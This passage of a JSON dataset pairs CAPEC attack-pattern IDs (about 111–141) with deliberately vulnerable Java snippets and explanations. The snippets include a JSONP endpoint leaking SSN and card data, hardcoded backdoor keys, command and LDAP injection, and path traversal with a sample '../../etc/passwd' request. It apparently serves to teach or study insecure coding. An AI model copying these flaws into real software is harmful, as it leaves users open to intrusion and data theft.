        "code_snippet": "// Server-side code\n@RestController\npublic class UserDataController {\n    @GetMapping(\"/api/user/data\")\n    public ResponseEntity<String> getUserData(@RequestParam String callback) {\n        UserData userData = userService.getCurrentUserData();\n        String jsonData = \"{\\\"ssn\\\":\\\"123-45-6789\\\",\\\"creditCard\\\":\\\"4111-1111-1111-1111\\\"}\";\n        \n        // Vulnerable: Returns JSONP without origin validation or CSRF protection\n        return ResponseEntity.ok(callback + \"(\" + jsonData + \")\");\n    }\n}\n\n// Client-side code\n<script>\nfunction loadUserData() {\n    var script = document.createElement('script');\n    script.src = 'http://vulnerable-site.com/api/user/data?callback=processData';\n    document.body.appendChild(script);\n}\n\nfunction processData(data) {\n    document.getElementById('userInfo').innerHTML = data.ssn + '<br>' + data.creditCard;\n}\n</script>",
        "description": "This code demonstrates a vulnerable JSONP implementation that allows cross-origin data theft. The server endpoint accepts a callback parameter and wraps the sensitive JSON data without proper origin validation or CSRF protection. The client-side code uses dynamic script injection to fetch data, making it susceptible to JSON hijacking attacks. An attacker can create a malicious site that loads this endpoint with their own callback function to steal sensitive data, bypassing the Same Origin Policy."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "public class AuthenticationService {\n    private static final String WEAK_FIXED_SALT = \"abc123\";\n    private static final int MIN_PASSWORD_LENGTH = 4;\n    \n    private Map<String, String> userPasswords = new HashMap<>();\n    \n    public void registerUser(String username, String password) {\n        if (password.length() >= MIN_PASSWORD_LENGTH) {\n            String hashedPassword = password + WEAK_FIXED_SALT;\n            userPasswords.put(username, hashedPassword);\n        }\n    }\n    \n    public boolean login(String username, String password) {\n        String storedHash = userPasswords.get(username);\n        String attemptedHash = password + WEAK_FIXED_SALT;\n        return storedHash != null && storedHash.equals(attemptedHash);\n    }\n    \n    public void resetPassword(String username) {\n        Random random = new Random();\n        String newPassword = String.valueOf(random.nextInt(9999));\n        registerUser(username, newPassword);\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities: weak password requirements (only 4 characters), use of a fixed salt for password hashing, predictable password reset using insufficiently random values, no protection against brute force attempts, and weak authentication mechanism using simple string comparison."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "public class DeviceController {\n    private static final int REGISTER_ACCESS = 0x1234;\n    private static final int DEBUG_MODE = 0x5678;\n    \n    public void handleIOCTL(int command, byte[] data) {\n        // No access control check before processing IOCTL commands\n        switch(command) {\n            case REGISTER_ACCESS:\n                writeToHardwareRegister(data);\n                break;\n            case DEBUG_MODE:\n                enableDebugMode(data);\n                break;\n        }\n    }\n    \n    private void writeToHardwareRegister(byte[] data) {\n        // Direct memory-mapped I/O access without validation\n        unsafe.putInt(REGISTER_ACCESS, ByteBuffer.wrap(data).getInt());\n    }\n    \n    private void enableDebugMode(byte[] data) {\n        // Allows debug mode activation during runtime\n        if(data[0] == 1) {\n            enableTestInterface();\n            modifySecureRegisters();\n        }\n    }\n    \n    private native void enableTestInterface();\n    private native void modifySecureRegisters();\n}",
        "description": "This code demonstrates vulnerable interface manipulation by implementing an IOCTL handler without proper access controls, allowing direct hardware register access and runtime debug mode activation. It lacks validation for register operations and enables unauthorized access to test interfaces and secure registers through unprotected commands."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "public class AuthenticationService {\n    private static final int MAX_ATTEMPTS = 999999;\n    private String hardcodedDebugKey = \"debug123\";\n    \n    public boolean authenticate(String username, String password) {\n        // Debug mode backdoor\n        if (password.equals(hardcodedDebugKey)) {\n            return true;\n        }\n        \n        int attempts = 0;\n        while (attempts < MAX_ATTEMPTS) {\n            try {\n                // Weak password validation\n                if (password.length() > 0) {\n                    return true;\n                }\n                attempts++;\n            } catch (Exception e) {\n                // Silently continue on authentication errors\n                continue;\n            }\n        }\n        return false;\n    }\n    \n    public boolean isAdmin(String sessionToken) {\n        // No verification of session token\n        return sessionToken != null;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including a hardcoded debug backdoor, insufficient authentication attempts limitation, weak password validation, error suppression, and insufficient session token verification. The authentication mechanism can be easily bypassed through multiple vectors."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "public class AuthenticationService {\n    private static boolean isAdmin = false;\n    private static String authToken = \"default_token\";\n\n    public static boolean authenticate(String username, String password) {\n        // Weak authentication using global flag\n        if (username.equals(\"admin\")) {\n            isAdmin = true;\n            return true;\n        }\n        return false;\n    }\n\n    public static boolean verifyAccess(String token) {\n        // Assumes token is immutable and not validated\n        return token.equals(authToken) || isAdmin;\n    }\n\n    public static boolean backdoorAccess(String specialKey) {\n        // Alternative authentication channel without proper verification\n        if (specialKey.length() > 0) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including use of a mutable global flag for admin status, weak token validation, and an alternative authentication path that bypasses proper verification. The authentication mechanism can be easily circumvented through multiple vectors, allowing unauthorized access to protected functionality."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "public class SystemProbe {\n    public static void main(String[] args) {\n        try {\n            // Debug flag not properly protected\n            boolean isDebugMode = true;\n            \n            // Sensitive information exposed through system properties\n            System.out.println(\"System Info: \" + System.getProperties());\n            System.out.println(\"Environment: \" + System.getenv());\n            \n            // Searching in untrusted path\n            String userPath = System.getProperty(\"user.dir\") + \"/plugins/\";\n            File pluginDir = new File(userPath);\n            File[] plugins = pluginDir.listFiles();\n            \n            // Loading and executing untrusted code\n            if (plugins != null) {\n                for (File plugin : plugins) {\n                    if (plugin.getName().endsWith(\".jar\")) {\n                        URLClassLoader loader = new URLClassLoader(\n                            new URL[]{plugin.toURI().toURL()}\n                        );\n                        Class<?> pluginClass = loader.loadClass(\"plugin.Main\");\n                        pluginClass.getMethod(\"execute\").invoke(null);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates information exposure through system probing. It reveals sensitive system properties and environment variables, uses an unprotected debug flag, searches for plugins in an untrusted path, and dynamically loads and executes code from those plugins without proper verification. An attacker could exploit this to gather system information and execute malicious code through the plugin mechanism."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "public class SensitiveDataTransmitter {\n    private Socket socket;\n    private String serverAddress = \"backend.example.com\";\n    private int port = 8080;\n\n    public void transmitUserData(String username, String password, String creditCardNumber) {\n        try {\n            socket = new Socket(serverAddress, port);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // Transmitting sensitive data in cleartext\n            String userData = \"username=\" + username + \"&password=\" + password + \"&ccnum=\" + creditCardNumber;\n            out.println(userData);\n            \n            // No message integrity check or encryption\n            out.flush();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendBulkData(String message) {\n        try {\n            socket = new Socket(serverAddress, port);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // No rate limiting or volume control\n            while(true) {\n                out.println(message);\n                out.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure data transmission by sending sensitive information (username, password, credit card numbers) in cleartext without encryption or message integrity checks. It also includes potential for network amplification attacks through unbounded message transmission. The code lacks proper security controls and could allow network sniffing and data interception."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "public class URLProcessor {\n    private static final String[] BLOCKED_CHARS = {\".\", \"/\", \"\\\\\"};\n    \n    public static String processURL(String input) {\n        // Basic filter that only checks for single encoding\n        if (containsBlockedChars(input)) {\n            return null;\n        }\n        \n        // Vulnerable: doesn't handle double encoding\n        String decodedUrl = URLDecoder.decode(input, StandardCharsets.UTF_8);\n        return decodedUrl;\n    }\n    \n    private static boolean containsBlockedChars(String input) {\n        for (String blocked : BLOCKED_CHARS) {\n            // Only checks for raw characters and simple encoding\n            if (input.contains(blocked) || \n                input.contains(URLEncoder.encode(blocked, StandardCharsets.UTF_8))) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This code is vulnerable to double encoding attacks as it only decodes the URL once and checks for blocked characters before decoding. An attacker could bypass the security check by double encoding malicious characters (e.g., using '%252E' for '.'). The filter checks for raw characters and single encoded versions but fails to detect double encoded variants, allowing potential path traversal or injection attacks to succeed."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private static final boolean DEBUG_MODE = true;\n    private static final String DEBUG_KEY = \"debug123\";\n    \n    public void processTransaction(String securityToken) {\n        if (DEBUG_MODE) {\n            System.out.println(\"Debug: Current security token = \" + securityToken);\n            System.out.println(\"Debug: System password = \" + getSystemPassword());\n            System.out.println(\"Debug: Database connection string = \" + getDatabaseConnection());\n        }\n        \n        if (securityToken == null || securityToken.isEmpty()) {\n            securityToken = \"default_token\";\n        }\n        \n        // Debug backdoor\n        if (securityToken.equals(DEBUG_KEY)) {\n            enableAdminAccess();\n            dumpSystemState();\n            toggleTestMode(true);\n        }\n    }\n    \n    private String getSystemPassword() {\n        return \"prod_password_123\";\n    }\n    \n    private String getDatabaseConnection() {\n        return \"jdbc:mysql://prod-server:3306/maindb\";\n    }\n    \n    private void enableAdminAccess() {\n        // Debug functionality left enabled in production\n    }\n    \n    private void dumpSystemState() {\n        // Dumps sensitive system information\n    }\n    \n    private void toggleTestMode(boolean enable) {\n        // Enables test/debug features in production\n    }\n}",
        "description": "This vulnerable code demonstrates a production system with active debug code that exposes sensitive information and functionality. It includes hardcoded debug credentials, reveals system information through debug messages, and contains a backdoor through a debug interface. The code fails to properly validate security tokens and includes test/debug features that can be activated at runtime, potentially allowing unauthorized access and exposure of sensitive data."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class BankAccount {\n    private double balance;\n    private boolean isAdmin = false;\n\n    public void processTransaction(String action, double amount) {\n        // Missing proper privilege checks\n        if(action.equals(\"withdraw\")) {\n            balance -= amount;\n        } else if(action.equals(\"setBalance\")) {\n            // Critical operation accessible to all users\n            balance = amount;\n        } else if(action.equals(\"transferAll\")) {\n            // Sensitive admin operation without privilege verification\n            transferAllFunds();\n        }\n    }\n\n    private void transferAllFunds() {\n        // No privilege check for critical operation\n        balance = 0.0;\n    }\n\n    public static void main(String[] args) {\n        BankAccount account = new BankAccount();\n        // Any user can perform admin operations\n        account.processTransaction(\"setBalance\", 1000000.0);\n        account.processTransaction(\"transferAll\", 0);\n    }\n}",
        "description": "This vulnerable code demonstrates improper privilege management in a banking system where critical operations like setting balance and transferring funds are accessible to all users without proper privilege checks. The code fails to implement access controls, allowing non-privileged users to perform administrative actions. The isAdmin flag exists but is never checked, and sensitive operations are not properly isolated or protected."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class VulnerableBuffer {\n    private byte[] buffer = new byte[10];\n\n    public byte readData(int index) {\n        // No bounds checking on index\n        return buffer[index];\n    }\n\n    public void writeData(byte[] source) {\n        // Using source buffer size instead of destination buffer size\n        for(int i = 0; i < source.length; i++) {\n            buffer[i] = source[i];\n        }\n    }\n\n    public void copyFromOffset(byte[] source, int offset) {\n        // No validation of offset, allowing negative values\n        System.arraycopy(source, offset, buffer, 0, source.length);\n    }\n}",
        "description": "This code demonstrates multiple buffer-related vulnerabilities including buffer over-read (CWE-126), buffer under-read (CWE-127), and improper buffer size validation (CWE-806). The readData method allows accessing memory outside the buffer bounds, writeData uses the source buffer size instead of checking destination buffer capacity, and copyFromOffset allows negative offsets without validation."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "public class SharedResourceExample {\n    private static int[] sharedBuffer = new int[1024];\n    \n    public static class TrustedThread extends Thread {\n        public void run() {\n            while(true) {\n                // Process sensitive data\n                for(int i = 0; i < sharedBuffer.length; i++) {\n                    sharedBuffer[i] = processSensitiveData();\n                }\n            }\n        }\n        \n        private int processSensitiveData() {\n            return (int)(Math.random() * 100000); // Simulated sensitive data\n        }\n    }\n    \n    public static class UntrustedThread extends Thread {\n        public void run() {\n            while(true) {\n                // Access shared buffer without synchronization\n                for(int i = 0; i < sharedBuffer.length; i++) {\n                    int data = sharedBuffer[i];\n                    // Potential information leak through timing analysis\n                    if(data > 50000) {\n                        try { Thread.sleep(1); } catch(InterruptedException e) {}\n                    }\n                }\n            }\n        }\n    }\n    \n    public static void main(String[] args) {\n        new TrustedThread().start();\n        new UntrustedThread().start();\n    }\n}",
        "description": "This code demonstrates vulnerable shared resource access where a trusted thread processes sensitive data in a shared buffer while an untrusted thread can access the same buffer without proper synchronization. The untrusted thread performs timing-based analysis that could leak information about the sensitive data through microarchitectural side channels. The code lacks proper isolation mechanisms and synchronization primitives, making it susceptible to resource sharing attacks."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "public class WebServer {\n    private ExecutorService threadPool;\n    \n    public WebServer() {\n        // No limit on number of threads\n        threadPool = Executors.newCachedThreadPool();\n    }\n    \n    public void handleRequest(Socket clientSocket) {\n        threadPool.execute(() -> {\n            try {\n                // No timeout set on socket operations\n                InputStream input = clientSocket.getInputStream();\n                OutputStream output = clientSocket.getOutputStream();\n                \n                // Process request without any rate limiting\n                byte[] buffer = new byte[8192];\n                while (input.read(buffer) != -1) {\n                    // Echo back data without checking size or rate\n                    output.write(buffer);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            // Resources not properly closed\n        });\n    }\n}",
        "description": "This vulnerable code demonstrates a web server implementation that is susceptible to resource exhaustion attacks. It creates an unbounded thread pool, doesn't implement request rate limiting, lacks proper resource cleanup, and doesn't control network message volume. The server blindly processes and echoes back all incoming data without any restrictions on size or frequency of requests, making it vulnerable to flooding attacks."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    private static final String BASE_PATH = \"/var/www/files/\";\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"filename\");\n        File file = new File(BASE_PATH + fileName);\n        \n        if(file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            \n            while ((bytesRead = fis.read(buffer)) != -1) {\n                response.getOutputStream().write(buffer, 0, bytesRead);\n            }\n            fis.close();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a path traversal vulnerability by directly concatenating user input (filename) with a base path without proper validation. An attacker can use '../' sequences in the filename parameter to traverse directories and access files outside the intended directory. For example, a request with filename=../../etc/passwd could access sensitive system files."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "public class FileExplorer extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String requestedPath = request.getParameter(\"path\");\n        File directory = new File(\"/var/www/files/\" + requestedPath);\n        \n        if(directory.isDirectory()) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            \n            File[] files = directory.listFiles();\n            out.println(\"<html><body>\");\n            out.println(\"<h2>Directory contents for: \" + requestedPath + \"</h2>\");\n            \n            for(File file : files) {\n                out.println(\"<a href='?path=\" + requestedPath + \"/\" + file.getName() + \"'>\" \n                    + file.getName() + \"</a><br>\");\n            }\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This vulnerable code implements a directory listing servlet that directly uses user input to explore and display directory contents without proper authentication or authorization checks. It allows path traversal and unauthorized access to sensitive files and directories. The code lacks input validation, proper access controls, and doesn't verify user permissions before displaying directory contents."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class AccountManager {\n    private int balance = 1000;\n\n    public boolean withdraw(int amount) {\n        if (amount <= 0) {\n            return false;  // Reject negative amounts\n        }\n        \n        int newBalance = balance + (-amount);  // Vulnerable to integer overflow\n        \n        if (newBalance <= balance) {  // Flawed check\n            balance = newBalance;\n            return true;\n        }\n        return false;\n    }\n\n    public int getBalance() {\n        return balance;\n    }\n}",
        "description": "This code contains an integer overflow vulnerability in a banking system. The withdraw method attempts to prevent negative amounts but fails to account for integer overflow when subtracting the amount from balance. An attacker could pass a large positive value that, when negated, causes an integer overflow resulting in a positive number being added instead of subtracted. The comparison check is also flawed as it doesn't properly handle wraparound cases."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class VulnerablePointerManipulation {\n    private int[] buffer = new int[100];\n    \n    public void processUserInput(int offset, int value) {\n        // Convert untrusted input to pointer/index without validation\n        int targetIndex = offset * 4;\n        \n        // Vulnerable pointer arithmetic without bounds checking\n        if(targetIndex >= 0) {\n            buffer[targetIndex] = value;  // Potential out-of-bounds access\n        }\n    }\n    \n    public Integer getDataAtOffset(int pointer) {\n        // Unsafe pointer dereferencing without null check\n        Integer obj = null;\n        try {\n            obj = buffer[pointer];\n            return obj * 2;  // Potential null pointer dereference\n        } catch(Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates multiple pointer-related vulnerabilities including untrusted pointer dereferencing, improper bounds checking, and null pointer dereferencing. The processUserInput method performs unsafe pointer arithmetic without proper validation, potentially leading to out-of-bounds memory access. The getDataAtOffset method contains unsafe pointer dereferencing that could result in null pointer exceptions."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "public class ResourceLeakExample {\n    private ArrayList<byte[]> memoryLeakList = new ArrayList<>();\n    \n    public void processRequest(String input) {\n        while (true) {\n            // Allocate large memory chunks without limits\n            byte[] largeArray = new byte[1024 * 1024 * 10]; // 10MB per allocation\n            memoryLeakList.add(largeArray);\n            \n            // Process input without bounds checking\n            String[] parts = input.split(\",\");\n            for (String part : parts) {\n                // Create new thread for each part without pool limits\n                new Thread(() -> {\n                    byte[] buffer = new byte[Integer.parseInt(part)];\n                    // Thread never terminates, resource never released\n                    while(true) {\n                        try {\n                            Thread.sleep(1000);\n                        } catch(InterruptedException e) {}\n                    }\n                }).start();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple resource-related issues: unlimited memory allocation, resource leaks, unconstrained thread creation, and failure to release resources. The code continuously allocates large memory chunks without bounds, stores them in a list that's never cleared, creates unlimited threads based on user input, and those threads never terminate, leading to resource exhaustion."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "public class ResourceLeakExample {\n    private static final int MAX_FILES = 1000;\n    private ArrayList<FileInputStream> fileList = new ArrayList<>();\n\n    public void processFiles(String[] filePaths) {\n        try {\n            for (String path : filePaths) {\n                FileInputStream fis = new FileInputStream(path);\n                fileList.add(fis);\n                // Process file content\n                byte[] content = new byte[1024];\n                fis.read(content);\n                // File is never closed, leading to resource leak\n                // Missing fis.close()\n            }\n        } catch (IOException e) {\n            // Exception handling without proper resource cleanup\n        }\n    }\n\n    public void keepProcessing() {\n        while (true) {\n            String[] newFiles = getMoreFiles();\n            processFiles(newFiles);\n            // Resources accumulate over time, never released\n        }\n    }\n\n    private String[] getMoreFiles() {\n        // Method to get more files to process\n        return new String[]{\"file1.txt\", \"file2.txt\"};\n    }\n}",
        "description": "This code demonstrates multiple resource leak vulnerabilities. It opens file input streams but never closes them, accumulating resources in an ArrayList. The continuous processing loop keeps creating new file handles without releasing old ones, eventually leading to resource exhaustion. The code violates proper resource management by missing release calls (CWE-404), leaking private resources (CWE-402), and failing to release resources after their effective lifetime (CWE-772)."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "public void processUserUpload(String userFilePath) {\n    File uploadedFile = new File(userFilePath);\n    \n    // Check if file exists before processing\n    if (uploadedFile.exists()) {\n        // Vulnerable: Time gap between check and usage allows for symlink manipulation\n        try {\n            FileInputStream fis = new FileInputStream(uploadedFile);\n            byte[] content = new byte[(int) uploadedFile.length()];\n            fis.read(content);\n            fis.close();\n            \n            // Process the file content\n            processContent(content);\n            \n            // Clean up the file\n            uploadedFile.delete();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code accepts a user-provided file path and processes the file without properly validating symbolic links. It contains a TOCTOU (Time of Check to Time of Use) race condition where an attacker could replace the file with a symbolic link between the existence check and actual file operations, potentially leading to unauthorized file access. The code also doesn't validate if the file path contains symbolic links or hard links that could point to sensitive system files."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "public class AdminConsole {\n    private static final String ADMIN_PASSWORD = \"secret123\";\n    private boolean isDebugMode = false;\n\n    public void processCommand(String command) {\n        if (command.startsWith(\"--\")) {\n            switch (command) {\n                case \"--help\":\n                    showHelp();\n                    break;\n                case \"--debug\":\n                    isDebugMode = true;\n                    showDebugInfo();\n                    break;\n                case \"--secret-backdoor\":\n                    enableHiddenAdmin();\n                    break;\n                default:\n                    System.out.println(\"Unknown command\");\n            }\n        }\n    }\n\n    private void showDebugInfo() {\n        if (isDebugMode) {\n            System.out.println(\"Debug Mode Active\");\n            System.out.println(\"Admin Password: \" + ADMIN_PASSWORD);\n            System.out.println(\"System Configuration: \" + getSystemConfig());\n        }\n    }\n\n    private void enableHiddenAdmin() {\n        System.out.println(\"Enabling hidden administrative access\");\n        // Undocumented backdoor access\n        grantFullSystemAccess();\n    }\n\n    private void grantFullSystemAccess() {\n        // Dangerous implementation\n    }\n\n    private String getSystemConfig() {\n        return \"sensitive_system_details\";\n    }\n\n    private void showHelp() {\n        System.out.println(\"Available commands: --help, --debug\");\n        // Notice hidden --secret-backdoor command is not listed\n    }\n}",
        "description": "This vulnerable code shows an admin console that processes command-line arguments with hidden functionality and debug options that can expose sensitive information. The code contains undocumented backdoor access (CWE-912), reveals sensitive information through debug mode (CWE-1296), has incomplete input validation for commands (CWE-184), and includes hidden administrative functions that aren't documented in the help menu."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "public void sendEmail(String recipient, String subject, String content) {\n    try {\n        Properties props = new Properties();\n        props.put(\"mail.smtp.host\", \"smtp.example.com\");\n        Session session = Session.getInstance(props);\n        Message message = new MimeMessage(session);\n        \n        message.setFrom(new InternetAddress(\"sender@example.com\"));\n        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipient));\n        message.setSubject(subject);\n        \n        // Vulnerable: No sanitization of content or headers\n        message.addHeader(\"X-Custom-Header\", content);\n        message.setText(content + \"\\r\\n--\\r\\nSent via EmailSystem\");\n        \n        Transport.send(message);\n    } catch (MessagingException e) {\n        e.printStackTrace();\n    }\n}",
        "description": "This code is vulnerable to email header injection and protocol delimiter manipulation. It directly uses unsanitized user input in both email headers and content without proper escaping or neutralization of special characters like CRLF sequences (\\r\\n). An attacker could inject additional headers or manipulate email content by including delimiter characters, potentially leading to email spoofing or header injection attacks."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "public class FormatStringVulnerability {\n    public static void logMessage(String userInput) {\n        String logFormat = \"User activity: \" + userInput;\n        System.out.printf(logFormat);\n    }\n\n    public static void main(String[] args) {\n        String userInput = getUserInput();\n        logMessage(userInput);\n    }\n\n    private static String getUserInput() {\n        // Simulated user input that could contain format specifiers\n        return \"%s%n%x%n\";\n    }\n}",
        "description": "This code is vulnerable to format string attacks because it directly uses unvalidated user input in printf-style formatting. An attacker could supply format specifiers like %s, %x, or %n to potentially read from or write to memory locations. The vulnerability occurs in the logMessage method where user input is directly passed to printf without proper validation or escaping."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "public class LDAPAuthenticator {\n    private LdapContext ldapContext;\n\n    public boolean authenticateUser(String username, String password) {\n        try {\n            String searchFilter = \"(&(objectClass=user)(sAMAccountName=\" + username + \"))\"; \n            SearchControls searchControls = new SearchControls();\n            searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n            \n            NamingEnumeration<SearchResult> results = ldapContext.search(\n                \"DC=company,DC=com\", \n                searchFilter,\n                searchControls\n            );\n            \n            return results.hasMore();\n        } catch (NamingException e) {\n            return false;\n        }\n    }\n}",
        "description": "This code is vulnerable to LDAP injection as it directly concatenates user input into the LDAP search filter without any sanitization. An attacker could input special characters like '*', '(', ')', '|', '&' to manipulate the query logic and potentially bypass authentication or extract unauthorized information from the LDAP directory."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String userId = request.getParameter(\"userId\");\n            String command = \"cmd.exe /c dir /user \" + userId;\n            \n            ProcessBuilder processBuilder = new ProcessBuilder(command);\n            Process process = processBuilder.start();\n            \n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            response.setContentType(\"text/plain\");\n            PrintWriter out = response.getWriter();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to parameter manipulation and command injection. It accepts a userId parameter via HTTP GET without proper validation or encoding, and directly incorporates it into a command string. An attacker could inject additional command parameters using '&' or manipulate the command execution by adding special characters. The use of GET method with sensitive commands and lack of parameter sanitization makes it susceptible to argument injection attacks."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "public class ReflectionHandler {\n    public static Object executeMethod(String className, String methodName, String[] params) {\n        try {\n            Class<?> dynamicClass = Class.forName(className);\n            Object instance = dynamicClass.newInstance();\n            Method method = dynamicClass.getMethod(methodName);\n            return method.invoke(instance);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public static void main(String[] args) {\n        String userClassName = request.getParameter(\"class\");\n        String userMethodName = request.getParameter(\"method\");\n        Object result = executeMethod(userClassName, userMethodName, null);\n    }\n}",
        "description": "This vulnerable code allows unrestricted reflection by accepting user input to specify class and method names. It directly uses Class.forName() with unsanitized input, allowing an attacker to load and execute arbitrary classes and methods. The code lacks proper input validation and access controls, making it susceptible to reflection-based attacks and potentially allowing execution of malicious code."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "public class FileHandler {\n    private static final String BASE_DIR = \"/var/www/files/\";\n    \n    public String readFile(String userInput) {\n        try {\n            String filePath = BASE_DIR + userInput;\n            File file = new File(filePath);\n            return new String(Files.readAllBytes(file.toPath()));\n        } catch (IOException e) {\n            return \"Error reading file\";\n        }\n    }\n    \n    public void writeFile(String userInput, String content) {\n        try {\n            String filePath = BASE_DIR + userInput;\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(content);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable file handling implementation that directly concatenates user input to a base directory path without proper validation or sanitization. The code allows path traversal attacks using '../' sequences or encoded variants, potentially enabling attackers to access files outside the intended directory structure. Both read and write operations are vulnerable to path traversal."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "public class MultiFormController extends Controller {\n    private Map<String, FormData> formSessions = new HashMap<>();\n\n    @PostMapping(\"/submit-form/{formName}\")\n    public String processForm(@PathVariable String formName,\n                           @RequestParam Map<String, String> formData,\n                           HttpSession session) {\n        String sessionId = session.getId();\n        FormData currentForm = formSessions.get(sessionId);\n\n        if (formName.equals(\"personalInfo\")) {\n            formSessions.put(sessionId, new FormData(formData));\n            return \"redirect:/form/address\";\n        }\n        else if (formName.equals(\"address\")) {\n            // No verification if previous form was completed\n            formSessions.get(sessionId).addAddressData(formData);\n            return \"redirect:/form/payment\";\n        }\n        else if (formName.equals(\"payment\")) {\n            // Directly accessible without completing previous forms\n            processPayment(formData);\n            return \"success\";\n        }\n        return \"error\";\n    }\n\n    private void processPayment(Map<String, String> paymentData) {\n        // Process payment without verifying form sequence\n    }\n}",
        "description": "This code demonstrates a vulnerable multi-step form processing system where forms can be accessed out of sequence. The code fails to verify if previous steps were completed before processing subsequent forms, lacks CSRF protection, and doesn't properly maintain form state. An attacker can bypass the intended form sequence by directly accessing later form endpoints, potentially leading to incomplete or invalid data collection."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "public class WebResourceCache {\n    private static Map<String, String> resourceCache = new HashMap<>();\n    private static boolean isInitialized = false;\n\n    public static String getResource(String url) {\n        if(!isInitialized) {\n            // Vulnerable: No validation of cache initialization source\n            initializeCache();\n            isInitialized = true;\n        }\n\n        if(resourceCache.containsKey(url)) {\n            // Vulnerable: No verification of cache integrity or freshness\n            return resourceCache.get(url);\n        }\n\n        String resource = fetchResourceFromNetwork(url);\n        // Vulnerable: No validation of resource authenticity before caching\n        resourceCache.put(url, resource);\n        return resource;\n    }\n\n    private static void initializeCache() {\n        try {\n            // Vulnerable: Loading cache from potentially untrusted source\n            File cacheFile = new File(\"resource_cache.dat\");\n            BufferedReader reader = new BufferedReader(new FileReader(cacheFile));\n            String line;\n            while((line = reader.readLine()) != null) {\n                String[] parts = line.split(\",\");\n                // Vulnerable: No validation of cache file contents\n                resourceCache.put(parts[0], parts[1]);\n            }\n            reader.close();\n        } catch(Exception e) {\n            // Silently fail and continue with empty cache\n        }\n    }\n\n    private static String fetchResourceFromNetwork(String url) {\n        // Implementation omitted\n        return \"resource_content\";\n    }\n}",
        "description": "This code demonstrates a vulnerable caching implementation where cached resources are loaded and used without proper validation of their authenticity, origin, or integrity. The cache is initialized from a local file without verification, and resources are stored and retrieved without checking their trustworthiness. This could allow an attacker to poison the cache with malicious content that would be served to users without verification."
    },
    {
        "capec_id": "142",
